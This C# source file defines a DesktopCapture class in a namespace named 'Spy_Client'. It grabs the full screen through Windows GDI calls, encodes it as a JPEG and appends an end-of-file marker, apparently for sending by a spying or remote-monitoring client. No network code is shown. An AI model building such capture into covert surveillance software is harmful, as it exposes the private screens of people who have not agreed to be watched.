using System;
using System.Collections.Generic;
using System.Text;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Windows.Forms;
namespace Spy_Client
{
    public class DesktopCapture
    {
        #region Rem-> [ API Declaration Statments ]
        [DllImport("user32.dll", EntryPoint = "GetSystemMetrics")] private static extern int GetSystemMetrics(int abc);
        [DllImport("user32.dll", EntryPoint = "GetDC")] private static extern IntPtr GetDC(IntPtr ptr);
        [DllImport("user32.dll", EntryPoint = "GetDesktopWindow")] private static extern IntPtr GetDesktopWindow();
        [DllImport("user32.dll", EntryPoint = "ReleaseDC")]private static extern IntPtr ReleaseDC(IntPtr hWnd, IntPtr hDc);
        [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleBitmap")]private static extern IntPtr CreateCompatibleBitmap(IntPtr hdc,int nWidth, int nHeight);
        [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleDC")] private static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32.dll", EntryPoint = "SelectObject")]private static extern IntPtr SelectObject(IntPtr hdc, IntPtr bmp);
        [DllImport("gdi32.dll", EntryPoint = "BitBlt")]private static extern bool BitBlt(IntPtr hdcDest, int xDest,int yDest, int wDest, int hDest, IntPtr hdcSource,int xSrc, int ySrc, int RasterOp);
        [DllImport("gdi32.dll", EntryPoint = "DeleteDC")]private static extern IntPtr DeleteDC(IntPtr hDc);
        [DllImport("gdi32.dll", EntryPoint = "DeleteObject")]private static extern IntPtr DeleteObject(IntPtr hDc);
        #endregion
        public static byte[] GetDesktopImage()
        {
            IntPtr DesktopHWnd = GetDC(GetDesktopWindow()); 
            IntPtr DesktopHDC = CreateCompatibleDC(DesktopHWnd);
            IntPtr BitmapHWnd = CreateCompatibleBitmap(DesktopHWnd, GetSystemMetrics(0), GetSystemMetrics(1));
            IntPtr BitmapHDC = (IntPtr)SelectObject(DesktopHDC, BitmapHWnd);
            BitBlt(DesktopHDC, 0, 0, GetSystemMetrics(0), GetSystemMetrics(1), DesktopHWnd, 0, 0, 13369376);
            SelectObject(DesktopHDC, BitmapHDC);
            System.Drawing.Bitmap Desktop = System.Drawing.Image.FromHbitmap(BitmapHWnd);
            ReleaseDC(GetDesktopWindow(), DesktopHWnd);
            DeleteDC(DesktopHDC);
            DeleteObject(BitmapHWnd);
            System.IO.MemoryStream ImageStream = new System.IO.MemoryStream();
            Desktop.Save(ImageStream, System.Drawing.Imaging.ImageFormat.Jpeg);
            byte[] ImageChunks = ImageStream.ToArray();
            Array.Resize(ref ImageChunks, ImageChunks.Length + 9);
            Array.Copy(Encoding.ASCII.GetBytes("[#<EOF>#]"), 0, ImageChunks, ImageChunks.Length - 9, 9);
            return (ImageChunks);
        }
    }
}
